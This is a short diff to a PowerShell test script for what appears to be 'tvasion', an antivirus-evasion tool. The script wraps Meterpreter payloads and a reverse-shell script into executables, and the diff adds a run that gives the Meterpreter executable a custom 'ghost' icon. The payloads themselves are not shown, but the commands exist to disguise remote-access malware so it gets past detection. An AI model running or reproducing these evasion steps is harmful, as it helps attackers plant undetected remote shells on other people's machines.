@@ -75,6 +75,7 @@ iex "$($__rootPath)/tvasion.ps1 -d -t exe $($__rootPath)/out/ReverseShell.ps1 -o
 if ($meterpreter) {
     iex "$($__rootPath)/tvasion.ps1 -d -t exe $($__rootPath)/out/Meterpreter_psh.ps1 -o $($__rootPath)/out/ps1exe_meterpreterpsh" # works maybe: requires small payload size restriction of arguments length of process.startupinfo.arguments
     iex "$($__rootPath)/tvasion.ps1 -d -t exe $($__rootPath)/out/Meterpreter_amd64.exe -o $($__rootPath)/out/exeexe_meterpreter" # works
+    iex "$($__rootPath)/tvasion.ps1 -d -t exe $($__rootPath)/out/Meterpreter_amd64.exe -o $($__rootPath)/out/exeexe_meterpreter -i $($__rootPath)/tests/ghost.ico" # works, test with icon
     #iex "$($__rootPath)/tvasion.ps1 -d -t exe $($__rootPath)/out/Meterpreter_x86.exe -o $($__rootPath)/out/exeexe_meterpreterx86" # untested
 }
 write-output "tvasion: tests finished! see results in ./out"; 
